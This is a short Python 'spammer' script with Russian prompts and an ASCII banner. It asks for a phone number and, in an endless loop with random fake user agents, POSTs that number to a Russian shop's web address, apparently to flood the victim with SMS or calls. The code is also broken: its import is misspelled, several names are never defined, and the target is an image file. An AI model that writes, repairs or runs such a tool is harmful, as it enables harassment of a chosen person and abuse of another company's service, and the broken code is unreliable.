import requests, fake_uswragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Введите номер телефона: ')

def banner():
    system("cls" if name == "nt" else "clear")
    print(BRIGHT + GREEN)
    print(r"  ___ ___  _   __  __ __  __ ___ ___  ")
    print(r" / __| _ \/_\ |  \/  |  \/  | __| _ \ ")
    print(r" \__ \  _/ _ \| |\/| | |\/| | _||   / ")
    print(r" |___/_|/_/ \_\_|  |_|_|  |_|___|_|_\ ")
    print()
    print(r"     Spammer: github.com/Ceep4iK      ")
    print(RESET_ALL)

while True:
	user = fake_useragent.UserAgent().random
	headers = {'user_agent' : user}

	try:
	    response = requests.post('https://shop.vsk.ru/personal/static/images/ajax-loader.gif', headers=headers, data={'phone' : NUMBER})
	    print('Сообщение отправленно')
	except:
		print('Что-то пошло не так')

	time.sleep(5)